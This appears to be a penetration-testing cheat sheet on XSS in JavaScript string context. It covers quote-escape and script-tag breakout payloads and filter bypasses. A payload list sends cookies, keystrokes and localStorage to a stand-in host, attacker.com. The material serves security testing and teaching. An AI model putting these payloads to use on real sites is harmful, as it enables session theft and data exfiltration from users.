# XSS in JavaScript String Context

## What it is

Your input lands inside a JavaScript string literal — not in HTML, not in an attribute. The browser is already past HTML parsing; it's now parsing JS. Breaking out means escaping the string, not the tag.

```html
<script>
  var query = 'USER_INPUT';
  var user  = "USER_INPUT";
  var data  = `USER_INPUT`;
</script>
```

---

## Where to look

- Search bars that echo the term into a JS variable for tracking/analytics
- Apps that pass server-side data into JS on page load: `var config = '{SETTING}'`
- Any `<script>` block where you can see your input reflected between quotes in the source
- JSON-like inline data: `var userData = {"name":"USER_INPUT"}`

**How to confirm it:** View source. Search for your input. If it's inside a `<script>` block wrapped in quotes, you're in JS string context.

---

## Escaping the string

| Quote type | Closer | Example payload |
|------------|--------|-----------------|
| Single `'` | `'` | `';alert(1)//` |
| Double `"` | `"` | `";alert(1)//` |
| Backtick `` ` `` | `` ` `` | `` `;alert(1)// `` |

**Anatomy of the payload:**
```
'   ;   alert(1)   //
^   ^   ^          ^
|   |   |          Comment out remainder of original line
|   |   Payload
|   End current statement
Close the string
```

---

## Real-world payloads

```javascript
// Cookie theft
';fetch('https://attacker.com/?c='+document.cookie)//

// Cookie theft via image (no fetch, works in older browsers)
';new Image().src='https://attacker.com/?c='+document.cookie//

// Keylogger
';document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}//

// Exfil localStorage
';fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))//

// Redirect
';window.location='https://attacker.com'//
```

---

## Alternative: break out of the script block entirely

When `'` is encoded or filtered, skip JS string escape and close the `<script>` tag:

```
</script><script>alert(1)</script>
```

This works because the HTML parser handles `</script>` before the JS parser even runs — it closes the script block regardless of whether you're inside a string.

**Which to use:**

| Approach | Needs | Use when |
|----------|-------|----------|
| JS string escape (`';payload//`) | `'` not filtered | Default — cleaner |
| Script tag break (`</script><script>`) | `<` and `>` not filtered | `'` is HTML-encoded |

---

## Filter bypasses

**Single quote escaped with backslash (`\'`):**
The app turns your `'` into `\'` — the string stays open. Counter it by injecting `\` before your `'` so the app's backslash escapes your backslash instead of the quote:

```
\';alert(1)//
```

App produces: `var q = '\\';alert(1)//';`  
Your `'` is now unescaped. Breaks out.

**Single quote HTML-encoded (`&#x27;`):**
Your `'` becomes `&#x27;` — useless for string escape in JS context. Switch to the script tag break approach instead.

**Parentheses filtered:**
```javascript
alert`1`          // backtick call
[1].find(alert)   // array method
```

**`alert` keyword filtered:**
```javascript
confirm(1)
prompt(1)
window['ale'+'rt'](1)
```

**Semicolons filtered:**
```javascript
'-alert(1)-'   // arithmetic — closes string, evaluates, re-opens
```

---

## Encoding reference

If payload is in a URL parameter that gets reflected into JS:

| Char | URL encoded |
|------|-------------|
| `'`  | `%27` |
| `"`  | `%22` |
| `;`  | `%3B` |
| `/`  | `%2F` |
| `\`  | `%5C` |
| `<`  | `%3C` |
| `>`  | `%3E` |
